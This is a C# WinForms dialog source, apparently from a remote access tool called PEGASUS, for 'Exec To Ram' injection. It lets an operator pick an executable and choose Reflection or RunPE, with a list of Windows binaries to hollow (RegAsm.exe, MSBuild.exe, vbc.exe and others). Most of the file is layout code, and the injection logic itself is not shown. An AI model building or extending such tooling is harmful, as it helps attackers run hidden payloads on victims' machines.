using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS.Helper;

namespace PEGASUS
{ 

public class FormSendFileToMemory : Form
{
	public bool IsOK;

	private IContainer components;

	private Label label2;

	private Label label1;

	private StatusStrip statusStrip1;

	public ToolStripStatusLabel toolStripStatusLabel1;

	private Label label3;

	public Guna2GradientButton button2;

	public Guna2GradientButton button1;

	public Guna2GradientButton button3;

	private Guna2Panel guna2Panel1;

	private Guna2TextBox textBox1;

	private Guna2PictureBox guna2PictureBox1;

	private Label label4;

	private PictureBox pictureBox1;

	public Guna2ComboBox comboBox1;

	public Guna2ComboBox comboBox2;

	private Guna2Separator guna2Separator1;

	private Guna2BorderlessForm guna2BorderlessForm1;

	private Guna2ShadowForm guna2ShadowForm1;

	public FormSendFileToMemory()
	{
		InitializeComponent();
	}

	private void SendFileToMemory_Load(object sender, EventArgs e)
	{
		comboBox1.SelectedIndex = 0;
		comboBox2.SelectedIndex = 0;
	}

	private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
		switch (comboBox1.SelectedIndex)
		{
		case 0:
			label3.Visible = false;
			comboBox2.Visible = false;
			break;
		case 1:
			label3.Visible = true;
			comboBox2.Visible = true;
			break;
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "(*.exe)|*.exe";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			toolStripStatusLabel1.Text = Path.GetFileName(openFileDialog.FileName);
			toolStripStatusLabel1.Tag = openFileDialog.FileName;
			toolStripStatusLabel1.ForeColor = Color.FromArgb(3, 130, 200);
			IsOK = true;
			if (comboBox1.SelectedIndex == 0)
			{
				try
				{
					new ReferenceLoader().AppDomainSetup(openFileDialog.FileName);
					IsOK = true;
				}
				catch
				{
					toolStripStatusLabel1.ForeColor = Color.Red;
					toolStripStatusLabel1.Text += " Invalid!";
					IsOK = false;
				}
			}
			textBox1.Text = Path.GetFileName(openFileDialog.FileName);
		}
		else
		{
			toolStripStatusLabel1.Text = "";
			toolStripStatusLabel1.ForeColor = Color.FromArgb(3, 130, 200);
			IsOK = true;
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		if (IsOK)
		{
			Hide();
		}
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		IsOK = false;
		Hide();
	}

	private void guna2PictureBox1_Click(object sender, EventArgs e)
	{
		Close();
	}

	[DllImport("user32.DLL")]
	private static extern void ReleaseCapture();

	[DllImport("user32.DLL")]
	private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

	private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
	{
		ReleaseCapture();
		SendMessage(base.Handle, 274, 61458, 0);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormSendFileToMemory));
		label2 = new System.Windows.Forms.Label();
		label3 = new System.Windows.Forms.Label();
		label1 = new System.Windows.Forms.Label();
		statusStrip1 = new System.Windows.Forms.StatusStrip();
		toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		comboBox1 = new Guna.UI2.WinForms.Guna2ComboBox();
		comboBox2 = new Guna.UI2.WinForms.Guna2ComboBox();
		button2 = new Guna.UI2.WinForms.Guna2GradientButton();
		button1 = new Guna.UI2.WinForms.Guna2GradientButton();
		button3 = new Guna.UI2.WinForms.Guna2GradientButton();
		guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
		guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
		pictureBox1 = new System.Windows.Forms.PictureBox();
		label4 = new System.Windows.Forms.Label();
		guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
		textBox1 = new Guna.UI2.WinForms.Guna2TextBox();
		guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
		guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
		statusStrip1.SuspendLayout();
		guna2Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
		((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
		SuspendLayout();
		label2.AutoSize = true;
		label2.Location = new System.Drawing.Point(8, 110);
		label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label2.Name = "label2";
		label2.Size = new System.Drawing.Size(26, 14);
		label2.TabIndex = 1;
		label2.Text = "File:";
		label3.AutoSize = true;
		label3.Location = new System.Drawing.Point(8, 227);
		label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label3.Name = "label3";
		label3.Size = new System.Drawing.Size(42, 14);
		label3.TabIndex = 1;
		label3.Text = "Target:";
		label3.Visible = false;
		label1.AutoSize = true;
		label1.Location = new System.Drawing.Point(8, 170);
		label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label1.Name = "label1";
		label1.Size = new System.Drawing.Size(33, 14);
		label1.TabIndex = 1;
		label1.Text = "Type:";
		statusStrip1.BackColor = System.Drawing.Color.Transparent;
		statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { toolStripStatusLabel1 });
		statusStrip1.Location = new System.Drawing.Point(0, 309);
		statusStrip1.Name = "statusStrip1";
		statusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
		statusStrip1.Size = new System.Drawing.Size(399, 22);
		statusStrip1.SizingGrip = false;
		statusStrip1.TabIndex = 2;
		statusStrip1.Text = "statusStrip1";
		toolStripStatusLabel1.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
		toolStripStatusLabel1.Name = "toolStripStatusLabel1";
		toolStripStatusLabel1.Size = new System.Drawing.Size(16, 17);
		toolStripStatusLabel1.Text = "...";
		comboBox1.BackColor = System.Drawing.Color.Transparent;
		comboBox1.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		comboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		comboBox1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		comboBox1.FocusedColor = System.Drawing.Color.FromArgb(94, 148, 255);
		comboBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		comboBox1.FocusedState.Parent = comboBox1;
		comboBox1.Font = new System.Drawing.Font("Electrolize", 9.749999f);
		comboBox1.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		comboBox1.HoverState.Parent = comboBox1;
		comboBox1.ItemHeight = 30;
		comboBox1.Items.AddRange(new object[2] { "Reflection", "RunPE" });
		comboBox1.ItemsAppearance.Parent = comboBox1;
		comboBox1.Location = new System.Drawing.Point(103, 148);
		comboBox1.Name = "comboBox1";
		comboBox1.ShadowDecoration.Parent = comboBox1;
		comboBox1.Size = new System.Drawing.Size(190, 36);
		comboBox1.TabIndex = 139;
		comboBox2.BackColor = System.Drawing.Color.Transparent;
		comboBox2.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		comboBox2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		comboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		comboBox2.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		comboBox2.FocusedColor = System.Drawing.Color.FromArgb(94, 148, 255);
		comboBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		comboBox2.FocusedState.Parent = comboBox2;
		comboBox2.Font = new System.Drawing.Font("Electrolize", 9.749999f);
		comboBox2.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		comboBox2.HoverState.Parent = comboBox2;
		comboBox2.ItemHeight = 30;
		comboBox2.Items.AddRange(new object[5] { "aspnet_compiler.exe", "RegAsm.exe", "MSBuild.exe", "RegSvcs.exe", "vbc.exe" });
		comboBox2.ItemsAppearance.Parent = comboBox2;
		comboBox2.Location = new System.Drawing.Point(103, 205);
		comboBox2.Name = "comboBox2";
		comboBox2.ShadowDecoration.Parent = comboBox2;
		comboBox2.Size = new System.Drawing.Size(190, 36);
		comboBox2.TabIndex = 140;
		button2.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		button2.BorderThickness = 1;
		button2.CheckedState.Parent = button2;
		button2.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		button2.CustomImages.Parent = button2;
		button2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		button2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		button2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		button2.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		button2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		button2.DisabledState.Parent = button2;
		button2.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		button2.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		button2.Font = new System.Drawing.Font("Electrolize", 9f);
		button2.ForeColor = System.Drawing.Color.White;
		button2.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		button2.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		button2.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		button2.HoverState.ForeColor = System.Drawing.Color.LightGray;
		button2.HoverState.Parent = button2;
		button2.Location = new System.Drawing.Point(11, 271);
		button2.Name = "button2";
		button2.ShadowDecoration.Parent = button2;
		button2.Size = new System.Drawing.Size(136, 30);
		button2.TabIndex = 142;
		button2.Text = "Ok";
		button2.Click += new System.EventHandler(button2_Click);
		button1.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		button1.BorderThickness = 1;
		button1.CheckedState.Parent = button1;
		button1.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		button1.CustomImages.Parent = button1;
		button1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		button1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		button1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		button1.DisabledState.Parent = button1;
		button1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		button1.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		button1.Font = new System.Drawing.Font("Electrolize", 9f);
		button1.ForeColor = System.Drawing.Color.White;
		button1.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		button1.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		button1.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		button1.HoverState.ForeColor = System.Drawing.Color.LightGray;
		button1.HoverState.Parent = button1;
		button1.Location = new System.Drawing.Point(251, 94);
		button1.Name = "button1";
		button1.ShadowDecoration.Parent = button1;
		button1.Size = new System.Drawing.Size(136, 30);
		button1.TabIndex = 143;
		button1.Text = "Browse";
		button1.Click += new System.EventHandler(button1_Click);
		button3.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		button3.BorderThickness = 1;
		button3.CheckedState.Parent = button3;
		button3.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		button3.CustomImages.Parent = button3;
		button3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		button3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		button3.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		button3.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		button3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		button3.DisabledState.Parent = button3;
		button3.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		button3.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		button3.Font = new System.Drawing.Font("Electrolize", 9f);
		button3.ForeColor = System.Drawing.Color.White;
		button3.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		button3.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		button3.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		button3.HoverState.ForeColor = System.Drawing.Color.LightGray;
		button3.HoverState.Parent = button3;
		button3.Location = new System.Drawing.Point(251, 271);
		button3.Name = "button3";
		button3.ShadowDecoration.Parent = button3;
		button3.Size = new System.Drawing.Size(136, 30);
		button3.TabIndex = 144;
		button3.Text = "Cancel";
		button3.Click += new System.EventHandler(Button3_Click);
		guna2Panel1.Controls.Add(guna2Separator1);
		guna2Panel1.Controls.Add(pictureBox1);
		guna2Panel1.Controls.Add(label4);
		guna2Panel1.Controls.Add(guna2PictureBox1);
		guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		guna2Panel1.Location = new System.Drawing.Point(0, 0);
		guna2Panel1.Name = "guna2Panel1";
		guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
		guna2Panel1.Size = new System.Drawing.Size(399, 67);
		guna2Panel1.TabIndex = 145;
		guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
		guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		guna2Separator1.BackColor = System.Drawing.Color.Transparent;
		guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Separator1.Location = new System.Drawing.Point(-450, 61);
		guna2Separator1.Name = "guna2Separator1";
		guna2Separator1.Size = new System.Drawing.Size(1299, 10);
		guna2Separator1.TabIndex = 14;
		guna2Separator1.UseTransparentBackground = true;
		pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
		pictureBox1.Location = new System.Drawing.Point(12, 12);
		pictureBox1.Name = "pictureBox1";
		pictureBox1.Size = new System.Drawing.Size(40, 42);
		pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		pictureBox1.TabIndex = 13;
		pictureBox1.TabStop = false;
		label4.AutoSize = true;
		label4.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		label4.Location = new System.Drawing.Point(143, 12);
		label4.Name = "label4";
		label4.Size = new System.Drawing.Size(114, 19);
		label4.TabIndex = 11;
		label4.Text = "Exec To Ram";
		guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
		guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
		guna2PictureBox1.ImageRotate = 0f;
		guna2PictureBox1.Location = new System.Drawing.Point(358, 12);
		guna2PictureBox1.Name = "guna2PictureBox1";
		guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
		guna2PictureBox1.Size = new System.Drawing.Size(29, 27);
		guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		guna2PictureBox1.TabIndex = 7;
		guna2PictureBox1.TabStop = false;
		guna2PictureBox1.UseTransparentBackground = true;
		guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
		textBox1.Animated = true;
		textBox1.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		textBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
		textBox1.DefaultText = "";
		textBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		textBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		textBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		textBox1.DisabledState.Parent = textBox1;
		textBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		textBox1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		textBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		textBox1.FocusedState.Parent = textBox1;
		textBox1.Font = new System.Drawing.Font("Electrolize", 9f);
		textBox1.ForeColor = System.Drawing.Color.White;
		textBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		textBox1.HoverState.Parent = textBox1;
		textBox1.Location = new System.Drawing.Point(48, 94);
		textBox1.Name = "textBox1";
		textBox1.PasswordChar = '\0';
		textBox1.PlaceholderText = "";
		textBox1.SelectedText = "";
		textBox1.ShadowDecoration.Parent = textBox1;
		textBox1.Size = new System.Drawing.Size(197, 30);
		textBox1.TabIndex = 146;
		guna2BorderlessForm1.ContainerControl = this;
		guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2ShadowForm1.TargetForm = this;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		base.ClientSize = new System.Drawing.Size(399, 331);
		base.Controls.Add(textBox1);
		base.Controls.Add(guna2Panel1);
		base.Controls.Add(button3);
		base.Controls.Add(button1);
		base.Controls.Add(button2);
		base.Controls.Add(comboBox2);
		base.Controls.Add(label3);
		base.Controls.Add(label2);
		base.Controls.Add(comboBox1);
		base.Controls.Add(label1);
		base.Controls.Add(statusStrip1);
		Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		ForeColor = System.Drawing.Color.LightGray;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Margin = new System.Windows.Forms.Padding(2);
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "FormSendFileToMemory";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
		Text = "Injection";
		base.Load += new System.EventHandler(SendFileToMemory_Load);
		statusStrip1.ResumeLayout(false);
		statusStrip1.PerformLayout();
		guna2Panel1.ResumeLayout(false);
		guna2Panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
		((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
		ResumeLayout(false);
		PerformLayout();
	}
}
}